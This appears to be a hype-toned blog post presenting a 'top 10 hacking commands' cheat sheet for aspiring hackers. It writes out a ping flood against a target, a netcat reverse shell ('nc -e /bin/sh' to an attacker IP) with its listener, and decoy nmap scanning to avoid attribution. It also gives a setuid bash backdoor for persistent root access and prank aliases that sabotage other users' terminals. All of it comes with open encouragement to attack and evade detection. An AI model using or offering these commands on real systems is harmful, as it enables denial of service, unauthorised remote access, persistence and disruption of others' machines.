# The Real “Top 10 Hacking Commands” That’ll Turn Your Terminal into a Weapon

**Yo Hackers, Script Kiddies, and Digital Nomads!**

Pull up a chair, fire up your Kali VM, and strap in — this ride is pure 🔥.

I just fell face-first into the most epic hacking cheat sheet ever dropped into the terminalverse. We're talking **packet floods**, **ICMP tunneling sorcery**, **backdoor persistence spells**, and **Nmap command-line acrobatics** that’d make even the grumpiest sysadmin weep.

So what are we dealing with? It’s called:

### ☕ Powered by Coffee, Fueled by Curiosity

This isn’t your dad’s "how to ping Google" tutorial. This is **real**.

We’ve got **ping commands on steroids**, **subdomain enumeration madness**, **packet captures that make WireShark cry**, and even **a train** (yes, a literal ASCII train) that hijacks your terminal.

Let’s break down the tastiest nuggets of hacker goodness.

### 🔥 Top 10 Insane Highlights:

### 1. **Ping Goes Nuclear**

Forget 64 bytes — let’s **flood hosts** like it’s a biblical event.

```bash
ping -s 1300 -f <target>
```

Pair this with `iftop` and **watch the chaos unfold in real-time**. It’s like watching a traffic jam... that you caused. On purpose.

### 2. **Tunnel SSH Over ICMP – WHAT?!**

TCP over ICMP? That’s like shoving a 4x4 through a straw. But yeah…

```bash
ptunnel
```

Run it, then SSH over echo requests. Firewalls? What firewalls?

### 3. **Nmap With Decoys – Become a Ghost**

Hide in plain sight by scanning with random decoys:

```bash
nmap -D RND:10 <target>
```

Now they don’t know who hit them. Could be you. Could be Aunt Becky.

### 4. **Run Bash As Root Anytime**

John Hammond dropped a root-level nuke:

```bash
sudo chmod +s /bin/bash
```

Now you can do:

```bash
/bin/bash -p
```

Congrats, you’re root. You’re the captain now.

### 5. **ASCII Steam Train (Yes, Really)**

Mistype `ls` as `sl` and… choo choo, your terminal’s hijacked.

```bash
sl
```

Bonus troll: alias `ls='sl'` and make your ops team question life.

### 6. **Wireshark’s Evil Cousin: tshark**

CLI packet-fu so powerful you’ll salivate:

```bash
tshark -i eth0 -Y "http.request.method == \"GET\""
```

Sniff only GETs. Like HTTP Tinder.

### 7. **Netcat: King of Reverse Shells**

Want shell access from a remote box? Netcat. Always Netcat.

```bash
attacker: nc -lvp 1337
target: nc -e /bin/sh <attacker-ip> 1337
```

Boom. Shell delivered, piping hot.

### 8. **Proxy Yourself to Japan via SSH**

Why be tracked when you can *vanish*?

```bash
ssh -D 1337 -C -q -N user@remote
```

Then set your browser proxy to SOCKS5 on port 1337.

Suddenly, you’re in Osaka eating ramen… virtually.

### 9. **Enumerate Subdomains Like a Pro**

Use `GoBuster`, `Sublist3r`, or `amass`.

Not only do they sound cool — they *are* cool.

Find everything they thought was hidden.

### 10. **Set a Terminal Trap with /dev/urandom**

Alias `ls` to:

```bash
cat /dev/urandom
```

Boom. Terminal chaos. Admin rage. You win.

### 🤯 Bonus: The Reverse Chat Server in Netcat

Ever texted someone via Netcat? Now you can.

It's like AOL chat... in 1994... but worse. And cooler.

### 💾 Forensic Ninja Mode

Use `tcpdump`, `tshark`, and `tshark`’s crazy filtering:

```bash
tshark -r capture.pcap -qz endpoints,ip
```

See *every* endpoint connection. Follow streams.

You’re the Matrix now.

### 💬 Final Words

If your bash history ain’t lookin’ like a warzone by now… did you even hack, bro?

So grab this cheat sheet, spin up your VM, sip some coffee (or yerba mate if you're *that* guy), and **go make some noise on the wire**. Because at the end of the day:

Catch you on the dark net,
